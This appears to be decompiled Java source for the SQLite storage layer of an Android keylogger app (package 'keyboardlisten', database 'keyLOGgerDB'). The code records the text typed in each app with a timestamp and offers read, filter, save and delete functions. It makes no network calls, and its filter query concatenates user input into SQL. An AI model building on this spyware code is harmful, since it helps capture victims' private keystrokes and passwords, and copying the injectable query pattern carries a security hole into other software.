package hack.hackit.pankaj.keyboardlisten;

import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteOpenHelper;
import java.util.ArrayList;

public class MyDatabaseHelper extends SQLiteOpenHelper {
    public static final String COLUMN_APPDATETIME = "App_DateTime";
    public static final String COLUMN_APPNAME = "Application_Name";
    public static final String COLUMN_APPTYPEDTEXT = "TypedText";
    public static final String COLUMN_PACKAGENAME = "Package_Name";
    public static final String COLUMN_SRNO = "SrNo";
    private static final String DATABASE_NAME = "keyLOGgerDB";
    private static final int DATABASE_VERSION = 2;
    public static final String TABLE_KEYEVENTS = "Appwise_KeyEvents";
    public static final String TABLE_SAVED_KEYEVENTS = "Saved_Appwise_KeyEvents";
    private static final String createKeyEventTable = "create table if not exists Appwise_KeyEvents(SrNo integer primary key autoincrement,Application_Name text not null,Package_Name text not null,App_DateTime datetime not null,TypedText text not null)";
    private static final String createSavedKeyEventTable = "create table if not exists Saved_Appwise_KeyEvents(SrNo integer primary key autoincrement,Application_Name text not null,Package_Name text not null,App_DateTime datetime not null,TypedText text not null)";

    public MyDatabaseHelper(Context context) {
        super(context, DATABASE_NAME, null, 2);
    }

    public void onCreate(SQLiteDatabase db) {
        db.execSQL(createKeyEventTable);
        db.execSQL(createSavedKeyEventTable);
    }

    public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {
        System.out.println("TABLE DROPPED.....");
        db.execSQL("drop table if exists Appwise_KeyEvents");
        db.execSQL("drop table if exists Saved_Appwise_KeyEvents");
        onCreate(db);
    }

    public String insertRecord(KeyEventData data, String table_name) {
        long return_Value;
        SQLiteDatabase db = getWritableDatabase();
        ContentValues values = new ContentValues();
        values.put(COLUMN_APPNAME, data.get_ApplicationName());
        values.put(COLUMN_PACKAGENAME, data.getAppPackageName());
        values.put(COLUMN_APPDATETIME, data.get_AppDateTime());
        values.put(COLUMN_APPTYPEDTEXT, data.get_TypedText());
        if (table_name.equals("Saved")) {
            return_Value = db.insert(TABLE_SAVED_KEYEVENTS, null, values);
        } else {
            return_Value = db.insert(TABLE_KEYEVENTS, null, values);
        }
        String status = "Success";
        if (return_Value == -1) {
            return "Fail";
        }
        return status;
    }

    public ArrayList<KeyEventData> readAllEventData(String table_name) {
        String query;
        ArrayList<KeyEventData> temp = new ArrayList();
        SQLiteDatabase db = getReadableDatabase();
        int limit = getRecordLimit();
        if (table_name.equals("Saved")) {
            query = "Select * from Saved_Appwise_KeyEvents order by SrNo DESC;";
        } else {
            query = "Select * from Appwise_KeyEvents order by SrNo DESC limit " + limit + ";";
        }
        Cursor cursor = db.rawQuery(query, null);
        String psd = BuildConfig.FLAVOR;
        if (cursor == null || cursor.getCount() <= 0) {
            cursor.close();
            System.out.println("Read Completed");
            return temp;
        }
        cursor.moveToFirst();
        do {
            KeyEventData Lgs = new KeyEventData();
            Lgs.set_SrNo(cursor.getLong(cursor.getColumnIndex(COLUMN_SRNO)));
            Lgs.set_ApplicationName(cursor.getString(cursor.getColumnIndex(COLUMN_APPNAME)));
            Lgs.set_AppPackageName(cursor.getString(cursor.getColumnIndex(COLUMN_PACKAGENAME)));
            Lgs.set_AppDateTime(cursor.getString(cursor.getColumnIndex(COLUMN_APPDATETIME)));
            Lgs.set_TypedText(cursor.getString(cursor.getColumnIndex(COLUMN_APPTYPEDTEXT)));
            temp.add(Lgs);
        } while (cursor.moveToNext());
        cursor.close();
        System.out.println("Read Completed");
        return temp;
    }

    public KeyEventData getLastRecord(String table_name) {
        SQLiteDatabase db = getReadableDatabase();
        String query = "Select * from Appwise_KeyEvents order by SrNo DESC limit 1;";
        if (table_name.equals("Saved")) {
            query = "Select * from Saved_Appwise_KeyEvents order by SrNo DESC limit 1;";
        }
        Cursor cursor = db.rawQuery(query, null);
        KeyEventData Lgs = new KeyEventData();
        String psd = BuildConfig.FLAVOR;
        if (cursor != null && cursor.getCount() > 0) {
            cursor.moveToFirst();
            Lgs.set_SrNo(cursor.getLong(cursor.getColumnIndex(COLUMN_SRNO)));
            Lgs.set_ApplicationName(cursor.getString(cursor.getColumnIndex(COLUMN_APPNAME)));
            Lgs.set_AppPackageName(cursor.getString(cursor.getColumnIndex(COLUMN_PACKAGENAME)));
            Lgs.set_AppDateTime(cursor.getString(cursor.getColumnIndex(COLUMN_APPDATETIME)));
            Lgs.set_TypedText(cursor.getString(cursor.getColumnIndex(COLUMN_APPTYPEDTEXT)));
        }
        cursor.close();
        return Lgs;
    }

    public int getRowCount(String table_name) {
        SQLiteDatabase db = getReadableDatabase();
        String query = "Select * from Appwise_KeyEvents;";
        if (table_name.equals("Saved")) {
            query = "Select * from Saved_Appwise_KeyEvents;";
        }
        Cursor cursor = db.rawQuery(query, null);
        int count = cursor.getCount();
        cursor.close();
        return count;
    }

    public void updateData(long srNo, String time, String text) {
        SQLiteDatabase db = getReadableDatabase();
        ContentValues cv = new ContentValues();
        cv.put(COLUMN_APPDATETIME, time);
        cv.put(COLUMN_APPTYPEDTEXT, text);
        db.update(TABLE_KEYEVENTS, cv, "SrNo=" + srNo, null);
    }

    public static ArrayList<String> getEventData() {
        return new ArrayList();
    }

    public ArrayList<KeyEventData> filterData(String filterKey, String table_name) {
        ArrayList<KeyEventData> temp = new ArrayList();
        SQLiteDatabase db = getReadableDatabase();
        String query = "Select * from Appwise_KeyEvents where UPPER(Application_Name) like UPPER('%" + filterKey + "%') order by " + COLUMN_SRNO + " DESC limit 100;";
        if (table_name.equals("Saved")) {
            query = "Select * from Saved_Appwise_KeyEvents where UPPER(Application_Name) like UPPER('%" + filterKey + "%') order by " + COLUMN_SRNO + " DESC limit 100;";
        }
        Cursor cursor = db.rawQuery(query, null);
        String psd = BuildConfig.FLAVOR;
        if (cursor == null || cursor.getCount() <= 0) {
            cursor.close();
            System.out.println("filter Completed");
            return temp;
        }
        cursor.moveToFirst();
        do {
            KeyEventData Lgs = new KeyEventData();
            Lgs.set_SrNo(cursor.getLong(cursor.getColumnIndex(COLUMN_SRNO)));
            Lgs.set_ApplicationName(cursor.getString(cursor.getColumnIndex(COLUMN_APPNAME)));
            Lgs.set_AppPackageName(cursor.getString(cursor.getColumnIndex(COLUMN_PACKAGENAME)));
            Lgs.set_AppDateTime(cursor.getString(cursor.getColumnIndex(COLUMN_APPDATETIME)));
            Lgs.set_TypedText(cursor.getString(cursor.getColumnIndex(COLUMN_APPTYPEDTEXT)));
            temp.add(Lgs);
        } while (cursor.moveToNext());
        cursor.close();
        System.out.println("filter Completed");
        return temp;
    }

    public void deleteRecord(KeyEventData data, String table_name) {
        SQLiteDatabase db = getWritableDatabase();
        if (table_name.equals("Saved")) {
            db.delete(TABLE_SAVED_KEYEVENTS, "SrNo='" + data.get_SrNo() + "'", null);
        } else {
            db.delete(TABLE_KEYEVENTS, "SrNo='" + data.get_SrNo() + "'", null);
        }
    }

    public void moveToSaveRecord(KeyEventData data) {
        deleteRecord(data, "All");
        insertRecord(data, "Saved");
    }

    public int getRecordLimit() {
        return HKApplication.getAppContext().getSharedPreferences("HackMode", 0).getInt("DB_Limit", 50);
    }
}
